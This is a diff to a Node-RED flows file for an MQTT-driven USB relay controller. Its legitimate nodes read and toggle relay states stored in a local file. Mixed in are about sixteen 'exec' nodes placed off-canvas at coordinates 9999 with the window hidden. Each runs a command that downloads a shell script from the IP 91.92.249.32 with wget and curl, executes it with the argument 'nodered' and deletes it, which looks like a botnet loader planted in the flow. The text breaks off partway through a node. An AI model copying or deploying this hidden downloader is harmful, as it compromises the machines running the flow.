+    {
+        "id": "01769b48-136d-4525-ab74-5dbbbda1686f",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "77b425a1-d493-4443-80fe-3b363cb78841"
+            ]
+        ]
+    },
+    {
+        "id": "e62c983c-b8ae-4b0e-aa3b-88de961df25a",
+        "type": "exec",
+        "z": "f12",
+        "command": "echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "9bc67682-9642-4001-b73d-b90cba365d7a",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "e62c983c-b8ae-4b0e-aa3b-88de961df25a"
+            ]
+        ]
+    },
+    {
+        "id": "f4675b20-f807-43e9-a028-53d94d84ca43",
+        "type": "exec",
+        "z": "f12",
+        "command": "echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "a8c0d770-1357-4881-9f5d-e0793f839a77",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "f4675b20-f807-43e9-a028-53d94d84ca43"
+            ]
+        ]
+    },
+    {
+        "id": "aa7523a3-ba1c-476c-92e8-ef4e3b87b1ff",
+        "type": "exec",
+        "z": "f12",
+        "command": "echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "99652bf7-c3fb-4f8e-b1de-daa2be6e2548",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "aa7523a3-ba1c-476c-92e8-ef4e3b87b1ff"
+            ]
+        ]
+    },
+    {
+        "id": "22648343-f37f-472b-8a46-1a411f92935e",
+        "type": "exec",
+        "z": "f12",
+        "command": "echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "9761eb35-edfa-4ae7-962b-4ccb653ce2de",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "22648343-f37f-472b-8a46-1a411f92935e"
+            ]
+        ]
+    },
+    {
+        "id": "0c2a66ad-f00a-4e48-b44c-6a396fe34bf0",
+        "type": "exec",
+        "z": "f12",
+        "command": "echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "7164c298-a6ac-4451-860a-7d642313b1a4",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "0c2a66ad-f00a-4e48-b44c-6a396fe34bf0"
+            ]
+        ]
+    },
+    {
+        "id": "4cbd5832-e617-45a0-b222-baff5737e312",
+        "type": "exec",
+        "z": "f12",
+        "command": "echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "4c494807-a77d-4e18-8659-b2f482781adc",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "4cbd5832-e617-45a0-b222-baff5737e312"
+            ]
+        ]
+    },
+    {
+        "id": "4062a579-1ec8-42a9-9a16-a30f66e2c630",
+        "type": "exec",
+        "z": "f12",
+        "command": "echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "78eaf5f0-be05-4b87-9eec-12d3452e546f",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "4062a579-1ec8-42a9-9a16-a30f66e2c630"
+            ]
+        ]
+    },
+    {
+        "id": "368fd468-dfe9-4a8e-b9c7-4a305df7af1a",
+        "type": "exec",
+        "z": "f12",
+        "command": "echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "560e4411-644c-4d2a-881a-72cdfe92001c",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "368fd468-dfe9-4a8e-b9c7-4a305df7af1a"
+            ]
+        ]
+    },
+    {
+        "id": "59166377-e4d2-4601-bd98-581ace9a7166",
+        "type": "exec",
+        "z": "f12",
+        "command": "echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "9b841029-dcfd-47ec-be1c-6c8d5b0e34fb",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "59166377-e4d2-4601-bd98-581ace9a7166"
+            ]
+        ]
+    },
+    {
+        "id": "d5469f84-b5c5-4c66-ae44-ab4fa8b23531",
+        "type": "exec",
+        "z": "f12",
+        "command": "echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "a9a45fb4-33ea-4e64-9e23-c8367e48b0dc",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "d5469f84-b5c5-4c66-ae44-ab4fa8b23531"
+            ]
+        ]
+    },
+    {
+        "id": "acbb1a4e-297a-4dae-9286-323d2eb0876a",
+        "type": "exec",
+        "z": "f12",
+        "command": "echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "4401ae30-78fc-47ad-aca6-3d695d6562f5",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "acbb1a4e-297a-4dae-9286-323d2eb0876a"
+            ]
+        ]
+    },
+    {
+        "id": "7085dedf-8c21-4bfb-bfa3-e6561280cd6d",
+        "type": "exec",
+        "z": "f12",
+        "command": "echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "c845cf85-edc4-47e2-93f7-54e6f96bacdf",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "7085dedf-8c21-4bfb-bfa3-e6561280cd6d"
+            ]
+        ]
+    },
+    {
+        "id": "93e4be36-ea23-4fde-b8c0-258792727053",
+        "type": "exec",
+        "z": "f12",
+        "command": "echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "139ea583-7134-46f6-b9c5-9cb97a867a88",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "93e4be36-ea23-4fde-b8c0-258792727053"
+            ]
+        ]
+    },
+    {
+        "id": "9e272d88-212e-4355-88ed-2287ced8cc2d",
+        "type": "exec",
+        "z": "f12",
+        "command": "echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "500decb0-3f85-4ad8-a5c0-9bcf77bbdcdb",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "9e272d88-212e-4355-88ed-2287ced8cc2d"
+            ]
+        ]
+    },
+    {
+        "id": "995740f5-9697-48c3-992a-af69b54f1bd0",
+        "type": "exec",
+        "z": "f12",
+        "command": "echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a",
+        "addpay": "",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "1000",
+        "winHide": true,
+        "oldrc": false,
+        "name": "",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "8d981482-3e95-4864-8548-5a0bd60812d3",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 9999,
+        "y": 9999,
+        "wires": [
+            [
+                "995740f5-9697-48c3-992a-af69b54f1bd0"
+            ]
+        ]
+    },
+    {
+        "id": "0e129eabd2502a06",
+        "type": "mqtt in",
+        "z": "f12",
+        "name": "",
+        "topic": "usbrelay/control/#",
+        "qos": "2",
+        "datatype": "auto-detect",
+        "broker": "c2d6bca38d1bbe4a",
+        "nl": false,
+        "rap": true,
+        "rh": 0,
+        "inputs": 0,
+        "x": 260,
+        "y": 140,
+        "wires": [
+            [
+                "e2b82903fa17d202"
+            ]
+        ]
+    },
+    {
+        "id": "96520539128a6283",
+        "type": "mqtt out",
+        "z": "f12",
+        "name": "",
+        "topic": "test",
+        "qos": "",
+        "retain": "",
+        "respTopic": "",
+        "contentType": "",
+        "userProps": "",
+        "correl": "",
+        "expiry": "",
+        "broker": "c2d6bca38d1bbe4a",
+        "x": 530,
+        "y": 1460,
+        "wires": []
+    },
+    {
+        "id": "44354cae62ce64e6",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 340,
+        "y": 1460,
+        "wires": [
+            [
+                "96520539128a6283"
+            ]
+        ]
+    },
+    {
+        "id": "ee2d0ce084a4c80e",
+        "type": "debug",
+        "z": "f12",
+        "name": "debug 1",
+        "active": false,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "true",
+        "targetType": "full",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 680,
+        "y": 140,
+        "wires": []
+    },
+    {
+        "id": "a71f57fc8ce0cec1",
+        "type": "file",
+        "z": "f12",
+        "name": "",
+        "filename": "./test",
+        "filenameType": "str",
+        "appendNewline": false,
+        "createDir": false,
+        "overwriteFile": "true",
+        "encoding": "none",
+        "x": 510,
+        "y": 1360,
+        "wires": [
+            [
+                "925c532f6cdc1651"
+            ]
+        ]
+    },
+    {
+        "id": "62cec0cecca64686",
+        "type": "inject",
+        "z": "f12",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "{\"QAAMZ_1\":0,\"QAAMZ_2\":0,\"QAAMZ_3\":0,\"QAAMZ_4\":0}",
+        "payloadType": "json",
+        "x": 350,
+        "y": 1360,
+        "wires": [
+            [
+                "a71f57fc8ce0cec1"
+            ]
+        ]
+    },
+    {
+        "id": "925c532f6cdc1651",
+        "type": "debug",
+        "z": "f12",
+        "name": "debug 2",
+        "active": true,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "false",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 680,
+        "y": 1360,
+        "wires": []
+    },
+    {
+        "id": "b0b56abc90dee190",
+        "type": "inject",
+        "z": "f12",
+        "name": "RELAY update",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "0.5",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 220,
+        "y": 1160,
+        "wires": [
+            [
+                "0c46d1a977347049"
+            ]
+        ]
+    },
+    {
+        "id": "0c46d1a977347049",
+        "type": "file in",
+        "z": "f12",
+        "name": "",
+        "filename": "./test",
+        "filenameType": "str",
+        "format": "utf8",
+        "chunk": false,
+        "sendError": false,
+        "encoding": "none",
+        "allProps": false,
+        "x": 450,
+        "y": 1160,
+        "wires": [
+            [
+                "6d09bc72d267a549"
+            ]
+        ]
+    },
+    {
+        "id": "934e3e8e7bf2d0f5",
+        "type": "debug",
+        "z": "f12",
+        "name": "debug 3",
+        "active": false,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "false",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 760,
+        "y": 1160,
+        "wires": []
+    },
+    {
+        "id": "6d09bc72d267a549",
+        "type": "json",
+        "z": "f12",
+        "name": "",
+        "property": "payload",
+        "action": "",
+        "pretty": false,
+        "x": 590,
+        "y": 1160,
+        "wires": [
+            [
+                "934e3e8e7bf2d0f5",
+                "55dc6e8c08efbd19"
+            ]
+        ]
+    },
+    {
+        "id": "55dc6e8c08efbd19",
+        "type": "function",
+        "z": "f12",
+        "name": "function 1",
+        "func": "// Assume msg.payload contains the relay states object\nvar relayStates = msg.payload; // e.g. {\"QAAMZ_1\":0,\"QAAMZ_2\":0,\"QAAMZ_3\":0,\"QAAMZ_4\":0}\n\nvar messages = [];\nfor (var key in relayStates) {\n    // Create a new message for each relay state\n    var newMsg = {\n        topic: \"usbrelay/state/\" + key,\n        payload: relayStates[key].toString()  // convert value to string\n    };\n    messages.push(newMsg);\n}\n\n// Return the array of messages so that each will be published separately\nreturn [messages];\n",
+        "outputs": 1,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 560,
+        "y": 1240,
+        "wires": [
+            [
+                "bfa30ca62d03cc81",
+                "5152f8467829b9f9"
+            ]
+        ]
+    },
+    {
+        "id": "bfa30ca62d03cc81",
+        "type": "debug",
+        "z": "f12",
+        "name": "debug 4",
+        "active": false,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "false",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 760,
+        "y": 1240,
+        "wires": []
+    },
+    {
+        "id": "5152f8467829b9f9",
+        "type": "mqtt out",
+        "z": "f12",
+        "name": "",
+        "topic": "",
+        "qos": "",
+        "retain": "",
+        "respTopic": "",
+        "contentType": "",
+        "userProps": "",
+        "correl": "",
+        "expiry": "",
+        "broker": "c2d6bca38d1bbe4a",
+        "x": 710,
+        "y": 1300,
+        "wires": []
+    },
+    {
+        "id": "58c79a9727a67d0e",
+        "type": "file in",
+        "z": "f12",
+        "name": "",
+        "filename": "./test",
+        "filenameType": "str",
+        "format": "utf8",
+        "chunk": false,
+        "sendError": false,
+        "encoding": "none",
+        "allProps": false,
+        "x": 410,
+        "y": 240,
+        "wires": [
+            [
+                "d9a91db25d5ced22"
+            ]
+        ]
+    },
+    {
+        "id": "d9a91db25d5ced22",
+        "type": "json",
+        "z": "f12",
+        "name": "",
+        "property": "payload",
+        "action": "",
+        "pretty": false,
+        "x": 570,
+        "y": 240,
+        "wires": [
+            [
+                "a0c768298328cd22",
+                "e128c8f18980de09"
+            ]
+        ]
+    },
+    {
+        "id": "e2b82903fa17d202",
+        "type": "function",
+        "z": "f12",
+        "name": "function 2",
+        "func": "// then splitting by \"/\" and taking the last part gives \"QAAMZ_2\".\nmsg.relay = msg.topic.split(\"/\").pop();\n\n// The payload remains unchanged (e.g., \"toggle\")\nreturn msg;",
+        "outputs": 1,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 440,
+        "y": 140,
+        "wires": [
+            [
+                "ee2d0ce084a4c80e",
+                "58c79a9727a67d0e"
+            ]
+        ]
+    },
+    {
+        "id": "0432d105ac55ddc1",
+        "type": "debug",
+        "z": "f12",
+        "name": "debug 5",
+        "active": false,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "true",
+        "targetType": "full",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 900,
+        "y": 180,
+        "wires": []
+    },
+    {
+        "id": "a0c768298328cd22",
+        "type": "function",
+        "z": "f12",
+        "name": "function 3",
+        "func": "// Get the relay identifier from msg.relay\nvar relay = msg.relay;\n\n// Check if relay exists in the payload\nif (relay && msg.payload.hasOwnProperty(relay)) {\n    // Toggle the value: if it's 1, set to 0; otherwise, set to 1.\n    msg.payload[relay] = msg.payload[relay] === 1 ? 0 : 1;\n} else {\n    node.error(\"Relay not found in payload\", msg);\n}\n\n// Return the modified message with the updated payload\nreturn msg;\n",
+        "outputs": 1,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 760,
+        "y": 240,
+        "wires": [
+            [
+                "0432d105ac55ddc1",
+                "bc1dda9fa8f60c7b",
+                "5db51b726cd713d9"
+            ]
+        ]
+    },
+    {
+        "id": "e128c8f18980de09",
+        "type": "debug",
+        "z": "f12",
+        "name": "debug 6",
+        "active": true,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "true",
+        "targetType": "full",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 460,
+        "y": 320,
+        "wires": []
+    },
+    {
+        "id": "5db51b726cd713d9",
+        "type": "function",
+        "z": "f12",
+        "name": "function 4",
+        "func": "// Assume msg.payload contains the relay states object\nvar relayStates = msg.payload; // e.g. {\"QAAMZ_1\":0,\"QAAMZ_2\":0,\"QAAMZ_3\":0,\"QAAMZ_4\":0}\n\nvar messages = [];\nfor (var key in relayStates) {\n    // Create a new message for each relay state\n    var newMsg = {\n        topic: \"usbrelay/state/\" + key,\n        payload: relayStates[key].toString()  // convert value to string\n    };\n    messages.push(newMsg);\n}\n\n// Return the array of messages so that each will be published separately\nreturn [messages];\n",
+        "outputs": 1,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 940,
+        "y": 300,
+        "wires": [
+            [
+                "67cb99ae6fa791e4"
+            ]
+        ]
+    },
+    {
+        "id": "67cb99ae6fa791e4",
+        "type": "mqtt out",
+        "z": "f12",
+        "name": "",
+        "topic": "",
+        "qos": "",
+        "retain": "",
+        "respTopic": "",
+        "contentType": "",
+        "userProps": "",
+        "correl": "",
+        "expiry": "",
+        "broker": "c2d6bca38d1bbe4a",
+        "x": 1090,
+        "y": 300,
+        "wires": []
+    },
+    {
+        "id": "a4fb0e7a7c4f5f65",
+        "type": "file in",
+        "z": "f12",
+        "name": "",
+        "filename": "./test",
+        "filenameType": "str",
+        "format": "utf8",
+        "chunk": false,
+        "sendError": false,
+        "encoding": "none",
+        "allProps": false,
+        "x": 950,
+        "y": 1240,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "58e3e5701fe0b84d",
+        "type": "debug",
+        "z": "f12",
+        "name": "debug 7",
+        "active": true,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "false",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 940,
+        "y": 360,
+        "wires": []
+    },
+    {
+        "id": "bc1dda9fa8f60c7b",
+        "type": "file",
+        "z": "f12",
+        "name": "",
+        "filename": "./test",
+        "filenameType": "str",
+        "appendNewline": false,
+        "createDir": false,
+        "overwriteFile": "true",
+        "encoding": "none",
+        "x": 790,
+        "y": 360,
+        "wires": [
+            [
+                "58e3e5701fe0b84d"
+            ]
+        ]
+    },
+    {
+        "id": "297c5cd363300939",
+        "type": "inject",
+        "z": "f12",
+        "name": "氣體更新",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "1",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 270,
+        "y": 460,
+        "wires": [
+            [
+                "4351d79176fcb5c7"
+            ]
+        ]
+    },
+    {
+        "id": "4351d79176fcb5c7",
+        "type": "file in",
+        "z": "f12",
+        "name": "",
+        "filename": "./test",
+        "filenameType": "str",
+        "format": "utf8",
+        "chunk": false,
+        "sendError": false,
+        "encoding": "none",
+        "allProps": false,
+        "x": 410,
+        "y": 460,
+        "wires": [
+            [
+                "3f53ae62b9525df7"
+            ]
+        ]
+    },
+    {
+        "id": "c2e019f372bbb096",
+        "type": "debug",
+        "z": "f12",
+        "name": "debug 8",
+        "active": false,
+        "tosidebar": true,
+        "console": false,
+        "tostatus": false,
+        "complete": "false",
+        "statusVal": "",
+        "statusType": "auto",
+        "x": 880,
+        "y": 460,
+        "wires": []
+    },
+    {
+        "id": "3f53ae62b9525df7",
+        "type": "json",
+        "z": "f12",
+        "name": "",
+        "property": "payload",
+        "action": "",
+        "pretty": false,
+        "x": 550,
+        "y": 460,
+        "wires": [
+            [
+                "f43ef1180b1cb5c9"
+            ]
+        ]
+    },
+    {
+        "id": "c5c1c43ccbc43ef1",
+        "type": "function",
+        "z": "f12",
+        "name": "function 5",
